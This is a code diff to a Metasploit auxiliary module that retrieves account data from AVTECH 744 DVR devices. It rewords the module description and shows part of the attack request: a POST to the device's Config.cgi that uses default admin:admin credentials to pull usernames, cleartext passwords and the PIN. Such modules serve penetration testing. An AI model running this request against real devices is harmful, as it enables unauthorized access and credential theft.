@@ -9,9 +9,9 @@ class Metasploit3 < Msf::Auxiliary
     super(update_info(info,
       'Name'           => 'AVTECH 744 DVR Account Information Retrieval',
       'Description'    => %q{
-        This module will extract the account information from the DVR,
-        including all user's usernames and cleartext passwords plus
-        the device PIN, along with a few other miscellaneous details.
+        This module will extract the accounts information from the AVTECH 744 DVR devices,
+        including all the usernames and cleartext passwords plus the device PIN, along with
+        a few other miscellaneous details.
       },
       'Author'         => [ 'nstarke' ],
       'License'        => MSF_LICENSE
@@ -23,7 +23,7 @@ class Metasploit3 < Msf::Auxiliary
     res = send_request_cgi({
       'method' => 'POST',
       'uri' => '/cgi-bin/user/Config.cgi',
-      'cookie' => 'SSID=YWRtaW46YWRtaW4=;',
+      'cookie' => "SSID=#{Rex::Text.encode_base64('admin:admin')};",
       'vars_post' => {
         'action' => 'get',
         'category' => 'Account.*'
